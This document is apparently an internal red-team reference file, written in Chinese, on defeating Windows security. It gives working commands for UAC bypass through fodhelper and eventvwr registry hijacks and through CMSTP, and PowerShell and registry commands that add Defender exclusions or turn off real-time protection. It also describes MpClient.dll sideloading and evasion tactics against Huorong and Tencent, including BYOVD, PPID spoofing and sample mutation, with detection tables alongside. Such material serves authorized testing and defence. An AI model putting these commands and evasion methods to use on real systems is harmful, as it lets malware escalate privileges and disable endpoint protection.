# Windows 安全组件对抗 — UAC 绕过 / Defender 全组件 / 国产杀软（火绒·腾讯）

> 本文件补齐审计 **P1-13（UAC 绕过）**、**P1-14（Defender 全组件）**、**P1-23（国产杀软火绒/腾讯）**。
> 覆盖 **原理 → 实现路线 → 检测侧 → 实测判据** 四段。
> 授权立场见 `refs/README.md`；360 QVM 专项见 `../packer/references/qvm-bypass.md`。

---

## 1. UAC 绕过（P1-13）

### 1.1 原理

UAC（用户账户控制）在「标准用户 → 管理员」提权时拦截。绕过分两类：
- **AutoElevate 白名单劫持**：利用系统「自动提权」的可信二进制（fodhelper/eventvwr/sdclt/CMSTP），
  通过注册表劫持其加载路径，使其以高完整性执行恶意载荷。
- **完整性级别判断**：先确认当前完整性级别（中/高），决定是否需绕过。

### 1.2 fodhelper 注册表劫持

```cmd
:: fodhelper.exe 以高完整性运行，读取 HKCU 下的 shell 命令
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "cmd.exe /c payload.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe
```

### 1.3 eventvwr / sdclt

```cmd
:: eventvwr.exe（事件查看器）自动提权，配合注册表项劫持
:: sdclt.exe（备份）同理，改写其注册表 command 项
reg add "HKCU\Software\Classes\folder\shell\open\command" /ve /t REG_SZ /d "cmd.exe /c payload.exe" /f
eventvwr.exe
```

### 1.4 CMSTP（LOLBin 自动提权）

```cmd
:: cmstp.exe 以高完整性执行 .inf，绕过 UAC
cmstp.exe /s /ns malicious.inf
```

### 1.5 检测侧

| 判据 | 遥测 |
|---|---|
| 4688 完整性级别 | 子进程完整性级别异常（中→高） |
| 异常父进程 | fodhelper/eventvwr 派生 cmd/powershell |
| AutoElevate 遥测 | 注册表 command 项被改 + 可信二进制执行 |

---

## 2. Defender 全组件绕过（P1-14）

### 2.1 组件全景

| 组件 | 作用 | 绕过方向 |
|---|---|---|
| ASR（攻击面减少规则） | 拦截 Office/脚本危险行为 | 规则绕过 + LOLBin 避开规则 |
| CFA（受控文件夹访问） | 保护文档目录 | 白名单进程/排除路径 |
| Tamper Protection | 防篡改 Defender 设置 | 关闭 Tamper（需安全模式/组策略） |
| MpCmdRun.exe + MpClient.dll | Defender 命令行 + 侧加载 | DLL 侧加载利用 |

### 2.2 排除/关闭（命令级）

```powershell
# 加排除（需管理员 + Tamper 关闭）
Add-MpPreference -ExclusionPath "C:\Temp"
Add-MpPreference -ExclusionProcess "payload.exe"
Add-MpPreference -ExclusionExtension ".evade"

# 实时保护关闭
Set-MpPreference -DisableRealtimeMonitoring $true
# 注册表等价：HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
```

### 2.3 ASR/CFA 绕过

| 组件 | 绕过路线 |
|---|---|
| ASR | 用规则未覆盖的 LOLBin/执行路径；或改 ASR 策略注册表（需 Tamper 关闭） |
| CFA | 用 CFA 白名单进程（如 `powershell.exe` 默认部分场景）写受保护目录；或加排除 |

### 2.4 MpCmdRun.exe + MpClient.dll 侧加载

```text
原理：MpCmdRun.exe 是 Defender 命令行工具，加载同目录 MpClient.dll
侧加载：把恶意 MpClient.dll 放到 MpCmdRun.exe 同目录（或利用 DLL 搜索顺序劫持），
使其加载恶意代码——借 Defender 签名二进制承载执行
```

### 2.5 检测侧

| 判据 | 遥测 |
|---|---|
| MpPreference 变更 | Defender 设置变更事件 + Tamper Protection 遥测 |
| ASR/CFA 规则触发 | ASR 规则事件（审计模式/阻止模式） |
| 侧加载 | Sysmon 7 异常 DLL 加载路径（Defender 目录） |

---

## 3. 国产杀软火绒/腾讯（P1-23）

### 3.1 火绒（Huorong）

| 检测面 | 对抗要点 |
|---|---|
| HIPS 行为拦截（注入/驱动/注册表） | 最小化显式危险行为 + LOLBin/签名 DLL 侧加载 |
| 进程树 + 命令行 | PPID 欺骗 + 命令行擦除（见 `OPSEC_HARDENING.md`） |
| 驱动加载拦截 | 避免未签名驱动；用已签名脆弱驱动（BYOVD） |

### 3.2 腾讯（Tencent PC Manager / 御点）

| 检测面 | 对抗要点 |
|---|---|
| 云查杀 | 离线/本地优先 + 变异去家族特征 |
| 驱动级防护 | BYOVD 杀驱动（`byovd-driver-exploitation.md`）或降级 |
| 样本聚类 | 变异 + 去编译特征 |

### 3.3 检测侧总表（七维外推，对齐 360 QVM 框架）

| 维度 | 火绒/腾讯检测点 | 对抗点 |
|---|---|---|
| PE 结构 | 异常节区/导入 | 结构规范化 |
| 导入表 | 危险导入 | IAT 伪装/动态解析 |
| 节区熵 | 高熵 | 熵伪装 |
| 行为序列 | 危险序列 | 行为拟真 |
| 数字签名 | 无/异常签名 | 签名复用 |
| 编译特征 | 编译器指纹 | 编译参数消减 |
| 云查杀 | 样本命中 | 变异 + 离线 |

---

## 4. 检测侧总表（回馈 attack-defense）

| 对抗 | 检测点 | 判据 |
|---|---|---|
| UAC 绕过 | 4688 完整性级别 + 异常父进程 | 中→高提权 + 可信二进制派生 shell |
| Defender 排除 | MpPreference 变更 | 排除项 + Tamper 遥测 |
| Defender 侧加载 | DLL 搜索顺序劫持 | Sysmon 7 异常加载 |
| 火绒/腾讯 | HIPS/云查杀/驱动 | 行为拦截 + 驱动加载事件 |

## 5. 实测判据

| 判据 | 方法 |
|---|---|
| UAC 是否绕过 | 进程以高完整性启动（whoami /groups 看 Mandatory Label） |
| Defender 是否失效 | 投递样本不被拦截 + 排除项存在 |
| 火绒/腾讯是否拦截 | HIPS 日志 + 云查杀命中 |

*WARNING: 授权红队评估与安全研究专用。*
